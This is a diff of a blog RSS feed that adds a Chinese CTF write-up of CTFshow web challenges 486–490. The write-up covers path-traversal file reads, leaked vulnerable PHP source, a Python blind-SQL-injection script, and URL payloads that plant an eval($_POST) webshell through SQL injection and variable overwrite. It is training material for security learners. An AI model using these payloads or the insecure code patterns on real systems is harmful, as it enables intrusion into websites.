@@ -10,14 +10,2559 @@
         </author>
         <description>一个妄想全栈web小废物</description>
         <language>zh-CN</language>
-        <pubDate>Wed, 19 Jul 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Wed, 19 Jul 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Thu, 20 Jul 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Thu, 20 Jul 2023 00:00:00 +0800</lastBuildDate>
         <category term="Clown" />
         <category term="Web" />
         <category term="Pwn" />
         <category term="CTF" />
         <category term="AWD" />
         <category term="ACM" />
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2023/07/20/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</guid>
+            <title>CTFshow-web中期测评</title>
+            <link>https://blog.xcu.icu/2023/07/20/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</link>
+            <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
+            <category term="ctfshow中期测评" scheme="https://blog.xcu.icu/tags/ctfshow%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/" />
+            <pubDate>Thu, 20 Jul 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;这块内容断断续续做了大概一周才做完，题目还是比较有意思的。有时候会因为一些原因卡住很久，这时候就会感觉很烦躁，依我的性子不该如此，或许是宅太久了也该出去走走&lt;/p&gt;
+&lt;h2 id=&#34;web486&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web486&#34;&gt;#&lt;/a&gt; Web486&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717211543138.png&#34; alt=&#34;image-20230717211543138&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;容器下发后打开发现是一个登录页&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717211617236.png&#34; alt=&#34;image-20230717211617236&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里在源码部分没有发现有可以利用的带你，但是看见在 url 这里有一个 action 参数，这里测试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717211724328.png&#34; alt=&#34;image-20230717211724328&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现其实是调用了一个 file_get_contents 函数来打开文件，这里直接读取文件，因为这个写了一个 templates 路径，所以要进行目录穿越&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717211917131.png&#34; alt=&#34;image-20230717211917131&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到 flag&lt;/p&gt;
+&lt;h2 id=&#34;web487&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web487&#34;&gt;#&lt;/a&gt; Web487&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717212027557.png&#34; alt=&#34;image-20230717212027557&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;容器下发还是这个登录页，尝试上一题的 payload&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718092331611.png&#34; alt=&#34;image-20230718092331611&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;还能文件读取，但是很显然 flag 不在这里了，这里将 index 等文件读取出来&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+if($action==&#39;check&#39;)&amp;#123;
+	$username=$_GET[&#39;username&#39;];
+	$password=$_GET[&#39;password&#39;];
+	$sql = &amp;quot;select id from user where username = md5(&#39;$username&#39;) and password=md5(&#39;$password&#39;) order by id limit 1&amp;quot;;
+	$user=db::select_one($sql);
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&amp;gt;$username));
+	&amp;#125;else&amp;#123;
+		header(&#39;location:index.php?action=login&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以看到当 action 等于 check 的时候会接受 username 和 password 参数，然后执行 sql 语句，这里闭合方式也很明显&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?action=check&amp;amp;username=admin&#39;) order by 1--+&amp;amp;password=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718092919178.png&#34; alt=&#34;image-20230718092919178&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就已经注入成功了，这里写脚本盲注&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import time
+
+flag = &#39;&#39;
+
+for i in range(1,250):
+    time.sleep(0.04)
+    low = 32
+    high = 128
+    mid = (low+high)//2
+    while(low&amp;lt;high):
+        # payload = &amp;quot;http://f36f977d-5543-4846-b3ee-d869355fc261.challenge.ctf.show/index.php?action=check&amp;amp;username=admin&#39;) and ascii(substr((database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;--+&amp;amp;password=1&amp;quot;.format(i,mid)
+        #payload = &amp;quot;http://f36f977d-5543-4846-b3ee-d869355fc261.challenge.ctf.show/index.php?action=check&amp;amp;username=admin&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;--+&amp;amp;password=1&amp;quot;.format(i,mid)
+        # payload = &amp;quot;http://f36f977d-5543-4846-b3ee-d869355fc261.challenge.ctf.show/index.php?action=check&amp;amp;username=admin&#39;) and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;--+&amp;amp;password=1&amp;quot;.format(i,mid)
+        payload = &amp;quot;http://f36f977d-5543-4846-b3ee-d869355fc261.challenge.ctf.show/index.php?action=check&amp;amp;username=admin&#39;) and ascii(substr((select group_concat(flag) from flag),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;--+&amp;amp;password=1&amp;quot;.format(i,mid)
+        r = requests.get(payload)#get方法传数据
+        # print(payload)
+        time.sleep(0.04)
+        if &#39;admin&#39; in r.text:#二分法
+            low = mid+1
+        else:
+            high = mid
+        mid = (low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+    flag = flag+chr(mid)
+    print(flag)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718100745765.png&#34; alt=&#34;image-20230718100745765&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web488&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web488&#34;&gt;#&lt;/a&gt; Web488&lt;/h2&gt;
+&lt;p&gt;还是先尝试上一题的 payload，先读取一下 index 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718102100918.png&#34; alt=&#34;image-20230718102100918&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	$username=$_GET[&#39;username&#39;];
+	$password=$_GET[&#39;password&#39;];
+	$sql = &amp;quot;select id from user where username = &#39;&amp;quot;.md5($username).&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+	$user=db::select_one($sql);
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&amp;gt;$username));
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;,array(&#39;username&#39;=&amp;gt;$username));
+	&amp;#125;
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里先 MD5 后再包裹，就不能再使用 sql 注入的方式了，这里接着读 render_class.php 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718103154723.png&#34; alt=&#34;image-20230718103154723&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+ini_set(&#39;display_errors&#39;, &#39;On&#39;);
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		if(cache::cache_exists($template))&amp;#123;
+			echo cache::get_cache($template);
+		&amp;#125;else&amp;#123;
+			$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		&amp;#125;
+	&amp;#125;
+	public static  function shade($templateContent,$arg)&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718103010479.png&#34; alt=&#34;image-20230718103010479&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+ini_set(&#39;display_errors&#39;, &#39;On&#39;);
+
+class db&amp;#123;
+	
+
+	public static  function getConnection()&amp;#123;
+		 $username=&#39;root&#39;;
+		 $password=&#39;root&#39;;
+		 $port=&#39;3306&#39;;
+		 $addr=&#39;127.0.0.1&#39;;
+		 $database=&#39;ctfshow&#39;;
+		return new mysqli($addr,$username,$password,$database);
+	&amp;#125;
+
+	public static function select_one($sql)&amp;#123;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718103219151.png&#34; alt=&#34;image-20230718103219151&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+ini_set(&#39;display_errors&#39;, &#39;On&#39;);
+class fileUtil&amp;#123;
+
+	public static function read($filename)&amp;#123;
+		return file_get_contents($filename);
+	&amp;#125;
+
+	public static function write($filename,$content,$append =0)&amp;#123;
+		if($append)&amp;#123;
+			file_put_contents($filename, $content,FILE_APPEND);
+		&amp;#125;else&amp;#123;
+			file_put_contents($filename, $content);
+		&amp;#125;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个 write 函数很明显可以尝试利用一下 FILE_APPEND 防止删除文件内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718103304723.png&#34; alt=&#34;image-20230718103304723&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+ini_set(&#39;display_errors&#39;, &#39;On&#39;);
+
+class cache&amp;#123;
+	public static function create_cache($template,$content)&amp;#123;
+		if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&amp;#123;
+			return true;
+		&amp;#125;else&amp;#123;
+			fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
+		&amp;#125;
+	&amp;#125;
+	public static function get_cache($template)&amp;#123;
+		return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+	public static function cache_exists($template)&amp;#123;
+		return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里将目录结构建立好，然后看一下代码逻辑&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718111124881.png&#34; alt=&#34;image-20230718111124881&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;找一下这个方法的调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718111153163.png&#34; alt=&#34;image-20230718111153163&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见是在 cache 中调用了这个方法，当这个传入的 template 文件的 md5 (template) 文件不存在时调用，接着找谁调用了 cache 的 create_cache 方法&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718111356265.png&#34; alt=&#34;image-20230718111356265&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里的条件也是没有这个 md5 (template) 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718111551739.png&#34; alt=&#34;image-20230718111551739&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;四处调用的机会，index 和 error 都会将 username 的数据传入这里因为不知道用户名密码，只能使用 error。读取一下 error.php 文件内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718111844830.png&#34; alt=&#34;image-20230718111844830&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;满足利用条件了，写一个马尝试一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?action=check&amp;amp;username=&amp;lt;?php%20eval($_POST[%27a%27]);%20?&amp;gt;&amp;amp;password=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718113617095.png&#34; alt=&#34;image-20230718113617095&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web489&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web489&#34;&gt;#&lt;/a&gt; Web489&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;../index
+../render/render_class
+../render/file_class
+../render/cache_class
+../render/db_class
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还是先尝试读文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	$sql = &amp;quot;select id from user where username = &#39;&amp;quot;.md5($username).&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+	extract($_GET);
+	$user=db::select_one($sql);
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&amp;gt;$username));
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;render_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		if(cache::cache_exists($template))&amp;#123;
+			echo cache::get_cache($template);
+		&amp;#125;else&amp;#123;
+			$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		&amp;#125;
+	&amp;#125;
+	public static  function shade($templateContent,$arg)&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;file_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+error_reporting(0);
+class fileUtil&amp;#123;
+
+	public static function read($filename)&amp;#123;
+		return file_get_contents($filename);
+	&amp;#125;
+
+	public static function write($filename,$content,$append =0)&amp;#123;
+		if($append)&amp;#123;
+			file_put_contents($filename, $content,FILE_APPEND);
+		&amp;#125;else&amp;#123;
+			file_put_contents($filename, $content);
+		&amp;#125;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;cache_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+class cache&amp;#123;
+	public static function create_cache($template,$content)&amp;#123;
+		if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&amp;#123;
+			return true;
+		&amp;#125;else&amp;#123;
+			fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
+		&amp;#125;
+	&amp;#125;
+	public static function get_cache($template)&amp;#123;
+		return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+	public static function cache_exists($template)&amp;#123;
+		return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;db_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+class db&amp;#123;
+	
+
+	public static  function getConnection()&amp;#123;
+		 $username=&#39;root&#39;;
+		 $password=&#39;root&#39;;
+		 $port=&#39;3306&#39;;
+		 $addr=&#39;127.0.0.1&#39;;
+		 $database=&#39;ctfshow&#39;;
+		return new mysqli($addr,$username,$password,$database);
+	&amp;#125;
+
+	public static function select_one($sql)&amp;#123;
+		$conn = db::getConnection();
+		$result=$conn-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;/templates/index.php&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;HTML&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;utf-8&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;CTFshow 新手入门题目 &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	欢迎你&lt;span class=&#34;token comment&#34;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718114428647.png&#34; alt=&#34;image-20230718114428647&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里多了一个删除功能&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718114508163.png&#34; alt=&#34;image-20230718114508163&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里将 error 的第二个参数删除了，结合上面的删除，很显然这里只能想办法利用这个有第二参数的地方&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718114945496.png&#34; alt=&#34;image-20230718114945496&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里使用了一个 exteact 函数可以实现变量覆盖，这里可以修改 sql 的值，似的 $user 的值为真进入 if 代码块，其他的就和上一题一样了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718120131387.png&#34; alt=&#34;image-20230718120131387&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web490&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web490&#34;&gt;#&lt;/a&gt; Web490&lt;/h2&gt;
+&lt;p&gt;这里还是先读取文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+$action=$_GET[&#39;action&#39;];
+if(!isset($action))&amp;#123;
+	header(&#39;location:index.php?action=login&#39;);
+	die();	
+&amp;#125;
+
+if($action==&#39;check&#39;)&amp;#123;
+	extract($_GET);
+	$sql = &amp;quot;select username from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+	$user=db::select_one($sql);
+	if($user)&amp;#123;
+		templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&amp;gt;$user-&amp;gt;username));
+	&amp;#125;else&amp;#123;
+		templateUtil::render(&#39;error&#39;);
+	&amp;#125;
+&amp;#125;
+if($action==&#39;clear&#39;)&amp;#123;
+	system(&#39;rm -rf cache/*&#39;);
+	die(&#39;cache clear&#39;);
+&amp;#125;
+
+if($action==&#39;login&#39;)&amp;#123;
+	templateUtil::render($action);
+&amp;#125;else&amp;#123;
+	templateUtil::render($action);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里看到 sql 语句和之前不一样了这个地方 username 存在注入点，看了一下逻辑，和上个题一样，不过这里不用变量覆盖了，构造注入来使得 username 的值写入 index 对应的 cache 中&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;?action=check&amp;amp;username=1&#39; union select &#39;&amp;lt;?php eval($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;&#39; --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718121844732.png&#34; alt=&#34;image-20230718121844732&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;写马一直失败，登录看一眼才发现是短标签，这里改一下 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;action=check&amp;amp;username=1&#39; union select &#39;eval($_POST[&amp;quot;a&amp;quot;]);&#39; --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718122035633.png&#34; alt=&#34;image-20230718122035633&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;连接就可以了&lt;/p&gt;
